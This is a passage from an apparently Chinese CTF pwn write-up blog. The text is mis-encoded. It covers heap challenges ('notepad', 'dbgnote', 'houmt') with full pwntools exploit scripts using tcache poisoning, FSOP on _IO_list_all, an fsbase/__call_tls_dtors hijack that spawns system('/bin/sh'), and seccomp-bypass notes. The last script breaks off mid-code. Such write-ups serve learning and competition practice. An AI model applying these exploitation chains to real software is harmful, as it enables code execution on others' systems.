class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./notepad&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, date, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;date: &quot;</span>, date)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;page: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;page: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, date, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;page: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;date: &quot;</span>, date)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">b&#x27;anza&#x27;</span>, <span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment">#0-7</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;protect&#x27;</span>, <span class="string">b&#x27;aaaaa&#x27;</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7fd810019ce0</span> - <span class="number">0x7fd80fe00000</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;date: &quot;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base===&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;anza&#x27;</span>, <span class="string">b&#x27;cccc&#x27;</span>) <span class="comment">#9(6)</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(_IO_list_all^key), p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;anza&#x27;</span>, <span class="string">b&#x27;dddd&#x27;</span>)  <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x80</span>, p64(heap_base+<span class="number">0x850</span>), <span class="string">b&#x27;&#x27;</span>)  <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line"></span><br><span class="line">fake_IO_list_all_addr = heap_base + <span class="number">0x850</span></span><br><span class="line">fake_IO_list_all = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base+<span class="number">0x970</span>)</span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)</span><br><span class="line"><span class="comment"># fake_IO_list_all = fake_IO_list_all.ljust(0xe0+0xe0, b&#x27;\x00&#x27;) + p64(heap_base)</span></span><br><span class="line"></span><br><span class="line">fake_wide_data = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_wide_data = fake_wide_data.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base+<span class="number">0xa90</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xebcf1</span></span><br><span class="line">fake_wide_vtable = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_wide_vtable = fake_wide_vtable.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;anza&#x27;</span>, fake_IO_list_all)   <span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;anza&#x27;</span>, fake_wide_data)     <span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;anza&#x27;</span>, fake_wide_vtable)   <span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">5</span>).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-dbgnote"><a href="#3-dbgnote" class="headerlink" title="3. dbgnote"></a>3. dbgnote</h2><p>æœ‰äº›ä»£ç çœ‹ä¸å¤ªæ‡‚ã€‚æŸ¥äº†ä¸€ä¸‹å¥½åƒæ˜¯å¼ºç½‘æ¯çš„åŸé¢˜<a href="https://www.anquanke.com/post/id/256124">å¹¿å·å¼ºç½‘æ¯pwn_mini WP</a>ã€‚</p><p>ç¨‹åºè¿è¡Œéœ€è¦ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸º<code>dbg</code>æˆ–è€…<code>run</code>ã€‚ç¨‹åºåˆè¯•çš„æ—¶å€™ç”³è¯·äº†ä¸¤ä¸ª signal ä¿¡å·ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072110909.png" alt="image-20230907211021001" style="zoom:50%;" /><p>æ¯”è¾ƒé‡è¦çš„æ˜¯ abort è§¦å‘çš„ handlerï¼Œä¼šä»¥ dbg å‚æ•°é‡å¯ç¨‹åºï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072114506.png" alt="image-20230907211418364" style="zoom:50%;" /><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ dbg å’Œ run è¿è¡Œçš„ç¨‹åºæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œdbg ä¸­æœ‰ä¸ªä»»æ„è¯»å’Œä»»æ„å†™ï¼Œrun å…¶å®å°±æ˜¯èœå•ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ‰¾åˆ°ä¸å †æœ‰å…³çš„æ¼æ´ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072118096.png" alt="image-20230907211834902" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072120745.png" alt="image-20230907212017529" style="zoom:50%;" /><p>åœ¨ run ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªå…¨å±€å˜é‡æº¢å‡º 2 ä¸ªå­—èŠ‚ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072135152.png" alt="image-20230907213531095" style="zoom:50%;" /><p>åœ¨ run ç¨‹åºä¸­å †æ“ä½œè¯»å…¥ idx çš„åœ°æ–¹å‘ç°äº†ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œæ³¨æ„é€šè¿‡è¿™ä¸ªæ ˆæº¢å‡ºæ˜¯å¯ä»¥é€ æˆ abort çš„ï¼Œä¹Ÿå°±å¯ä»¥è§¦å‘ handlerï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072124739.png" alt="image-20230907212442697" style="zoom:50%;" /><p>åŒæ—¶åœ¨ Super_Note æ“ä½œä¸­æœ‰ä¸€ä¸ª giftï¼Œå¯ä»¥æ³„éœ²æ ˆä¸Šå¯¹åº”åœ°å€çš„æœ€åä¸¤ä½ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072145857.png" alt="image-20230907214512813" style="zoom: 50%;" /><p>æœ€åè¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œæœ‰å…³ libc åŸºå€çš„æ³„éœ²ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_DEBUG=all è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œé¢„ç¤ºç€ç¨‹åºæ‰§è¡Œæ—¶æ‰“å°loaderçš„ä¿¡æ¯ï¼Œé€šè¿‡é‡Œé¢çš„ä¿¡æ¯å¯ä»¥è·å–libcåœ°å€ã€‚</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜çš„æ€è·¯æ˜¯å°† LD_DEBUG=all å¸ƒç½®åœ¨æ ˆä¸Šï¼Œç„¶åé€šè¿‡ gift è·å–åˆ°æ ˆä¸Šçš„æœ€åä¸¤å­—èŠ‚ï¼Œå†è®¡ç®—åç§»å¾—åˆ° LD_DEBUG=all çš„åœ°å€ï¼Œå†é€šè¿‡å…¨å±€å˜é‡çš„ä¸¤ä¸ªæº¢å‡ºä¿®æ”¹ envp æŒ‡å‘ LD_DEBUG=all çš„åœ°å€ï¼Œé€šè¿‡åœ°å€ä»»æ„è¯»æ³„éœ² ld åŸºå€ï¼Œç”¨åœ°å€ä»»æ„å†™å»åŠ«æŒ fsbase ç›¸å…³ç»“æ„ä½“ï¼Œåœ¨ exit è°ƒç”¨ __call_tls_dtors è§¦å‘é“¾å­ã€‚</p><p>è¿™é‡Œæœ‰ä¸‰ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š</p><ol><li><p>fsbase ç»“æ„ä½“åœ¨å“ªä¸ªä½ç½®ï¼Ÿæˆ‘å’Œèˆ’å“¥éƒ½æ˜¯åœ¨ ubuntu22.04 ä¸Šè¿è¡Œçš„ç¨‹åºï¼Œä½†æ˜ å°„åˆ†å¸ƒæœ‰äº›è®¸å·®å¼‚ï¼Œæˆ‘çš„åˆ†å¸ƒåœ¨ ld åŸºå€é™„è¿‘ï¼Œè€Œèˆ’å“¥çš„åˆ†å¸ƒåœ¨ libc åŸºå€é™„è¿‘ã€‚å¦‚æœåˆ†å¸ƒåœ¨ libc é™„è¿‘ï¼Œå°±ä¸éœ€è¦ä»»æ„è¯»æ¥æ³„éœ²ä»€ä¹ˆäº†ï¼Œç›´æ¥æ‰“ fsbase å°±è¡Œäº†ï¼Œä½†å¦‚æœåˆ†å¸ƒåœ¨ ld é™„è¿‘ï¼Œå°±æœ‰å¿…è¦æ³„éœ² ld åŸºå€äº†ï¼Œè¿™è¾¹å¯ä»¥é€šè¿‡ _dl_argv_ptr è¿™ä¸ªå˜é‡æ¥æ³„éœ²ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309101300968.png" alt="image-20230910130020654" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309101257383.png" alt="image-20230910125743268" style="zoom:50%;" /></li><li><p>fsbase çš„æ¿å­è¯¥æ€ä¹ˆæ‰“ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fsbase = ld_base - <span class="number">0x168C0</span></span><br><span class="line">target = fsbase - <span class="number">0x30</span> - <span class="number">0x28</span></span><br><span class="line">payload = p64(target+<span class="number">0x70</span>)</span><br><span class="line">payload += <span class="number">12</span>*p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fsbase) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(target+<span class="number">0x80</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼ˆåªæ˜¾ç¤ºäº†éƒ¨åˆ†ï¼‰å¦‚ä¸‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309101316985.png" alt="image-20230910131656766" style="zoom:50%;" /></li><li><p>é“¾å­æ˜¯å¦‚ä½•è§¦å‘çš„ï¼Ÿæˆ‘ä»¬çœ‹ä¸€ä¸‹ __call_tls_dtors çš„æ±‡ç¼–ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309101329701.png" alt="image-20230910132905633"></p><p>å› æ­¤åœ¨ call rax çš„æ—¶å€™å³å®Œæˆäº† system(â€œ/bin/sh\x00â€)çš„æ“ä½œ</p></li></ol><p>EXP å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;./dbgnote&quot;</span>, <span class="string">&quot;run&quot;</span>])</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">b&quot;LD_DEBUG=all&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;UserName: &quot;</span>, name)</span><br><span class="line"></span><br><span class="line">gift = <span class="string">b&quot;++--++--&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *$rebase(0x1524)&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;$ &quot;</span>, gift)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Super note: &quot;</span>)</span><br><span class="line">stack_low = <span class="built_in">int</span>(io.recvline(), <span class="number">10</span>)</span><br><span class="line">target = stack_low + <span class="number">0x1c</span></span><br><span class="line">log.success(<span class="string">&quot;stack_low==&gt;&quot;</span>+<span class="built_in">hex</span>(stack_low))</span><br><span class="line">log.success(<span class="string">&quot;target=====&gt;&quot;</span>+<span class="built_in">hex</span>(target))</span><br><span class="line"></span><br><span class="line">hijack = <span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span> + p16(target)</span><br><span class="line">io.sendafter(<span class="string">b&quot;$ &quot;</span>, hijack)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;$ &quot;</span>, <span class="string">b&quot;Note_Add&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Size: &quot;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;file=libc.so.6 [0];  generating link map&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;base: 0x0000&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Please don&#x27;t patch this normal function, we will check it!&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">_dl_argv_ptr = libc_base + <span class="number">0x218E08</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;[Addr] &quot;</span>, p64(_dl_argv_ptr))</span><br><span class="line">log.success(<span class="string">&quot;ld_ptr=====&gt;&quot;</span>+<span class="built_in">hex</span>(_dl_argv_ptr))</span><br><span class="line">offset = <span class="number">0x7fd730bedac0</span> - <span class="number">0x7fd730bb4000</span></span><br><span class="line">ld_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - offset</span><br><span class="line">log.success(<span class="string">&quot;ld_base====&gt;&quot;</span>+<span class="built_in">hex</span>(ld_base))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">fsbase = ld_base - <span class="number">0x168C0</span></span><br><span class="line">target = fsbase - <span class="number">0x30</span> - <span class="number">0x28</span></span><br><span class="line">payload = p64(target+<span class="number">0x70</span>)</span><br><span class="line">payload += <span class="number">12</span>*p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fsbase) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># paylaod += p64(libc_base-0x28c0) + p64(0)</span></span><br><span class="line">payload += p64(target+<span class="number">0x80</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(libc_base + 0x0000000000036c06)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0x01C32)&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendafter(<span class="string">b&quot;[Addr] &quot;</span>, p64(target))</span><br><span class="line">io.sendafter(<span class="string">b&quot;[Write] &quot;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-houmt"><a href="#4-houmt" class="headerlink" title="4. houmt"></a>4. houmt</h2><p>çœ‹ä¸‹æ¥æ„Ÿè§‰å°±æ˜¯é™åˆ¶å¤ªå¤šã€å¥½éº»çƒ¦ï¼Œèœé¸Ÿå´©æºƒğŸ˜­ï¼Œäºæ˜¯è·Ÿç€å‡ºé¢˜äººçš„ wp æ¥è°ƒï¼š<a href="https://www.cnblogs.com/winmt/articles/17512349.html">CISCN-2023 åä¸œå—åˆ†åŒºèµ› houmt å‡ºé¢˜å°è®°</a>ã€‚</p><p>é¢˜ç›®çš„æ¼æ´æ˜¯ UAFï¼Œé™åˆ¶æ˜¯ add å›ºå®š 0x100 å¤§å°ï¼Œ 2 æ¬¡ showï¼Œ1 æ¬¡ editï¼Œè¿˜åªèƒ½ edit 8å­—èŠ‚ï¼Œ<strong>æ— æ³•ç”³è¯·åˆ° libc ä¸Šçš„åœ°å€</strong>ï¼Œåœ¨ show çš„æ—¶å€™è¿˜æœ‰åŠ å¯†ï¼Œä½†åŠ å¯†éƒ¨åˆ†æˆ‘ä»¬å…ˆä¸å…³å¿ƒï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102149421.png" alt="image-20230910214957369" style="zoom:50%;" /><p>æ¼æ´æ€è·¯æ˜¯ï¼š</p><ol><li><p>ç”³è¯·å †å—ï¼Œé‡Šæ”¾ï¼Œè·å¾— heap_baseã€‚</p></li><li><p>é‡Šæ”¾æ»¡ 7 ä¸ªå †å—ï¼Œå†é‡Šæ”¾ä¸€ä¸ªæº¢å‡ºè‡³ unsorted binï¼Œæ³„éœ²å‡º libc_baseã€‚</p></li><li><p>é€šè¿‡ UAF é…åˆ Editï¼ŒåŠ«æŒ <strong>tcache_perthread_struct</strong> ä¸­ 0x110 å¯¹åº”çš„æŒ‡é’ˆé™„è¿‘ã€‚</p></li><li><p>ä¸æ–­é‡Šæ”¾ã€ç”³è¯·è¯¥ç»“æ„ä½“ä¸­çš„ 0x110 å¯¹åº”çš„æŒ‡é’ˆä¸ºä»»æ„åœ°å€ï¼Œå³å¯è¿›è¡Œå¤šæ¬¡ä»»æ„åœ°å€å†™ã€‚</p></li><li><p>ç”±äºæœ¬é¢˜æ²¡æœ‰æ­£å¸¸çš„é€€å‡ºï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹<code>top chunk</code>å¤§å°è§¦å‘<code>__malloc_assert</code>ï¼Œè¿™ä¸€å—ä½œè€…ç»™å‡ºäº†å¾ˆè¯¦ç»†çš„è§£é‡Šï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102234979.png" alt="image-20230910223450740" style="zoom:50%;" /></li><li><p>ç„¶åå°±æ˜¯ç»•è¿‡æ²™ç®±ï¼Œä¸€èˆ¬å°±æ˜¯åˆ©ç”¨<code>setcontext+61</code>ä»¥åŠ<code>magic</code>å®Œæˆå¯¹ç›®æ ‡å †å—åœ°å€çš„è½¬æ¢ï¼Œæ²™ç®±è§„åˆ™å¦‚ä¸‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102236633.png" alt="image-20230910223646356" style="zoom:50%;" /><p>ä¸€èˆ¬ç»•è¿‡ read çš„ fd==0 é™åˆ¶æ–¹æ³•æ˜¯åˆ©ç”¨ close(0)ï¼Œä½†å¯ä»¥åˆ©ç”¨ mmap å°† fd=3 æ˜ å°„åˆ°æŸæ®µå†…å­˜ä¸­ï¼Œå†åˆ©ç”¨ writev ä»£æ›¿ write å‡½æ•°ã€‚</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./houmt&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the index : &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the index : &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the index : &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="string">b&quot;a&quot;</span>)   <span class="comment">#0-7</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    leak.append(u8(io.recv(<span class="number">1</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    leak[i] = leak[i] ^ leak[i+<span class="number">1</span>]</span><br><span class="line">t = <span class="string">b&#x27;&#x27;</span></span><br><span 